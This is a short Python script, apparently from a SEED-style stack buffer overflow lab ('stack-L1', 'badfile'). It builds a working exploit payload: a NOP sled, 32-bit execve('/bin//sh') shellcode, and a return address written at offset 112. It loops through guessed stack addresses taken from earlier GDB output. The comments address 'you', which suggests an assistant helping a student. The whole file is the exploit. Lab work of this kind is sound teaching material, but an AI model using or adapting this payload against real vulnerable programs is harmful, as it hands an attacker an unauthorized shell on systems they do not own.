#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Test addresses based on what we saw in your GDB output
# Your ESP was around 0xffffcaa0, so let's test around that area
test_addresses = [
    0xffffca80,
    0xffffca90,
    0xffffcaa0,  # This was your ESP
    0xffffcab0,
    0xffffcac0,
    0xffffcad0,
    0xffffcae0,
    0xffffcaf0
]

for i, addr in enumerate(test_addresses):
    content = bytearray(0x90 for i in range(517))
    
    # Place shellcode at position 300
    start = 300
    content[start:start + len(shellcode)] = shellcode
    
    # Use the test address
    ret = addr
    offset = 112
    L = 4
    content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
    
    # Write to badfile
    with open('badfile', 'wb') as f:
        f.write(content)
    
    print(f"Test {i+1}: Address 0x{addr:08x}")
    print("Run: ./stack-L1")
    print("Press Enter after testing to continue to next address...")
    input()